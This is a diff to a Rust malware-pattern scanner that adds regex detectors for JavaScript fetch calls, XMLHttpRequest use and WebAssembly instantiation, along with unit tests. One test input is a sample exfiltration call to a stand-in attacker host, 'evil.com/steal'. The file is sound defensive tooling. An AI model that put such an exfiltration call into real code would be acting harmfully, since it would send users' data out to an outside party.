@@ -132,6 +132,28 @@ pub const fn all_patterns() -> &'static [Pattern] {
             file_glob: GLOB,
             description: "Use of deprecated Node.js cipher methods",
         },
+        // Critical/High patterns missing from original 17
+        Pattern {
+            id: "fetch-api",
+            severity: RiskLevel::Medium,
+            regex: r"\bfetch\s*\(",
+            file_glob: GLOB,
+            description: "Fetch API call — potential data exfiltration",
+        },
+        Pattern {
+            id: "xml-http-request",
+            severity: RiskLevel::Medium,
+            regex: r"XMLHttpRequest",
+            file_glob: GLOB,
+            description: "XMLHttpRequest usage — potential data exfiltration",
+        },
+        Pattern {
+            id: "web-assembly",
+            severity: RiskLevel::Low,
+            regex: r"WebAssembly\.\s*(?:instantiate|compile|instantiateStreaming)\s*\(",
+            file_glob: GLOB,
+            description: "WebAssembly instantiation — potentially obfuscated malicious code",
+        },
     ]
 }
 
@@ -682,8 +704,97 @@ mod tests {
     }
 
     #[test]
+    fn test_fetch_api() {
+        let p = &all_patterns()[17];
+        assert_eq!(p.id, "fetch-api");
+        assert_pattern(
+            p,
+            &[
+                PatternCase {
+                    code: "fetch('https://evil.com/steal')",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "await fetch(url, options)",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "window.fetch('/api/data')",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "fetchData()",
+                    should_match: false,
+                },
+                PatternCase {
+                    code: "// fetch is used here",
+                    should_match: false,
+                },
+            ],
+        );
+    }
+
+    #[test]
+    fn test_xml_http_request() {
+        let p = &all_patterns()[18];
+        assert_eq!(p.id, "xml-http-request");
+        assert_pattern(
+            p,
+            &[
+                PatternCase {
+                    code: "new XMLHttpRequest()",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "XMLHttpRequest.DONE",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "xhr = new XMLHttpRequest",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "HttpRequest",
+                    should_match: false,
+                },
+            ],
+        );
+    }
+
+    #[test]
+    fn test_web_assembly() {
+        let p = &all_patterns()[19];
+        assert_eq!(p.id, "web-assembly");
+        assert_pattern(
+            p,
+            &[
+                PatternCase {
+                    code: "WebAssembly.instantiate(bytes)",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "WebAssembly.compile(buffer)",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "WebAssembly.instantiateStreaming(response)",
+                    should_match: true,
+                },
+                PatternCase {
+                    code: "WebAssembly.Module",
+                    should_match: false,
+                },
+                PatternCase {
+                    code: "WebAssembly.Memory",
+                    should_match: false,
+                },
+            ],
+        );
+    }
+
+    #[test]
     fn test_all_patterns_count() {
-        assert_eq!(all_patterns().len(), 17);
+        assert_eq!(all_patterns().len(), 20);
     }
 
     #[test]
